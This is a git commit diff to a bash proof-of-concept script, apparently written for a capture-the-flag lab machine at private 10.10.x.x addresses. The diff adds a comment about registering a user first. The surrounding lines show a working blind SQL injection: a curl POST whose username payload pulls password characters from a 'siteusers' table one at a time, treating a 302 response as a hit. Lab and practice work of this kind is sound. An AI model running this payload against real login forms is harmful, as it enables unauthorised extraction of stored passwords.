6fc0f2fdfc2414b7053f4359831c716037c193dc
Adam Rose <93153300+AdamRose1@users.noreply.github.com>
2024-03-01 06:24:16 -0500

    Update Kitty.sh

--- POC_Bash-Scripts/Kitty.sh
+++ POC_Bash-Scripts/Kitty.sh
@@ -9,6 +9,7 @@ num=$1
 offset=$2
 char=$3
 
+# Make sure to register username johnwick on the site (http://10.10.72.244/register.php) first before running this script
 request=$(curl -X POST -sqi 'http://10.10.26.45/index.php' --proxy 127.0.0.1:8080 --data "username=johnwick'and (select (select ascii(substring(password,$num,1))from siteusers limit 1 offset $offset)='$char')-- -");
 if [[ $request == *302* ]];
 	  then char_letter=$(echo "$char" | awk '{printf "%c\n", $1 }');
